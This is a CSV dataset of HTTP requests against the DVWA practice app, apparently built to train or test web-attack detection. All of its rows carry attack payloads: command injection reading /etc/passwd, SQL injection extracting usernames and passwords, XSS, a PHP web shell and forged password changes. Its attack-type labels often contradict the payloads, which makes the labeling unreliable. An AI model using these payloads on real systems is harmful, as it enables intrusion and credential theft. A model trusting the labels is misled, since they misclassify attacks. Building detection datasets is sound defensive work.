request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
23,2025-12-01 3:40:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=efffbc23ba45e4da35125ffd4e656ce5"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,file_upload,anomalous
24,2025-12-01 3:50:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=34e246fa1255f1f3e2bf6e32555ed345"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,sqli,anomalous
25,2025-12-01 4:00:00,GET,"http://dvwa.local/vulnerabilities/upload/?id=1'+UNION+SELECT+1,username,password+FROM+users--","{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2663fb25f35a4deb114ca52c5bfdda45"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
26,2025-12-01 4:10:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=66d63fd65beed3a4ea54653454c4ccd4"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,xss,anomalous
27,2025-12-01 4:20:00,GET,http://dvwa.local/vulnerabilities/xss_r/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=df13bd3cb16154d4f43eb6b653664e4a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
28,2025-12-01 4:30:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=33246bca515ca45deb6dfb5bf336f3be"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,sqli,anomalous
29,2025-12-01 4:40:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6d3cfce6e52ad664bc26ae64c4124c44"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,csrf,anomalous
30,2025-12-01 4:50:00,GET,http://dvwa.local/vulnerabilities/sqli/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=614b5be42adbfbafe2fc2352d2a65fb3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
31,2025-12-01 5:00:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2ad21d61f2b35243cfcefebf2eb6a4bb"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,command_injection,anomalous
32,2025-12-01 5:10:00,GET,http://dvwa.local/vulnerabilities/xss_s/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=21dbe245362e1c2cb5e41456422a64dc"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
33,2025-12-01 5:20:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cb2a36b1efbdd625b4aaff2ec1eb321d"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
34,2025-12-01 5:30:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=adcbdda3ce3154a5aa65113fbad4246b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
35,2025-12-01 5:40:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1ededc1b15e344cbc242c4f44f612252"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,xss,anomalous
36,2025-12-01 5:50:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fdda1dfa4a5521f145f42dfbab5e31cc"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,file_upload,anomalous
37,2025-12-01 6:00:00,GET,http://dvwa.local/vulnerabilities/fi/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e6e43a2ed1ed562ba26d22b3b12db366"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
38,2025-12-01 6:10:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1ad6e4c6bd411312522bc3253ae36244"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
39,2025-12-01 6:20:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=645c31f441fbc25afe631bbbf14b5456"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
40,2025-12-01 6:30:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c6ea6524bd43b3faad5131bddaf4fb52"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,sqli,anomalous
41,2025-12-01 6:40:00,GET,http://dvwa.local/vulnerabilities/sql_i/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3dae1c31e6141a5aee3eac2b14bee243"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
42,2025-12-01 6:50:00,GET,http://dvwa.local/vulnerabilities/xss_s/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=36ac45dde4fa2d5a2d4fef6ec3e4daff"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
43,2025-12-01 7:00:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bddf3bff352f24a3e13ba53fbc2e6abf"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,command_injection,anomalous
44,2025-12-01 7:10:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=11e2cb3fe1ddf6d5fb5f5fb35dea1553"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
45,2025-12-01 7:20:00,GET,http://dvwa.local/vulnerabilities/csrf/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bcb4a1e412bd63144a62f3e542c6f5ab"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
46,2025-12-01 7:30:00,GET,http://dvwa.local/vulnerabilities/exec/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=d3e655d21bd11c6b232514aa2124e2f2"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
47,2025-12-01 7:40:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=43daaffc2d3356be1dfdcbde2c5bd1d4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
48,2025-12-01 7:50:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5fbefc2ad253dabbdeeaa1edef1422bb"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,command_injection,anomalous
49,2025-12-01 8:00:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4c11abdff21d2b63de413d4e362433af"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,csrf,anomalous
50,2025-12-01 8:10:00,GET,http://dvwa.local/vulnerabilities/upload/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2c225b3a6badb3e4653abcd21dc5ee43"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
51,2025-12-01 8:20:00,GET,http://dvwa.local/vulnerabilities/upload/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6dd66433ff163d115ee4ba6a623c4d1d"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
52,2025-12-01 8:30:00,GET,http://dvwa.local/vulnerabilities/upload/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c312ae3b4a16e65fc6d25b11365c5c66"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
53,2025-12-01 8:40:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5a1b6d61f65fcbbfdc3414c5541b3cbd"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,xss,anomalous
54,2025-12-01 8:50:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c46d3a23abde153db5d2cbb32e1f12cc"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,csrf,anomalous
55,2025-12-01 9:00:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1e6b45c1b5f33f5fabe113dadacaf31a"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,sqli,anomalous
56,2025-12-01 9:10:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e4462f6e55e3212ec113caad3114ced6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,sqli,anomalous
57,2025-12-01 9:20:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=265ca2f35caf144b6c51144c561ed123"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
58,2025-12-01 9:30:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ae2e13edc1cc5bfaee1eddafe14ae2aa"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,csrf,anomalous
59,2025-12-01 9:40:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c5d5cc334533ecddf2de5f434dcda53a"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,csrf,anomalous
60,2025-12-01 9:50:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dcc1c16e4f33f3eb1c56615a4aab2abc"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,file_upload,anomalous
61,2025-12-01 10:00:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2a1ea31d13f6c61c2de4a6fc3d4a62ae"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,file_upload,anomalous
62,2025-12-01 10:10:00,GET,http://dvwa.local/vulnerabilities/sql_i/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=23a52d6656c531d63d12c5acb446d115"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
63,2025-12-01 10:20:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=43a3ebca2226d24fc1ec2e4dcade4bee"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
64,2025-12-01 10:30:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=edbcf1eaeb2dedeb5561cebdfafffadc"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,file_upload,anomalous
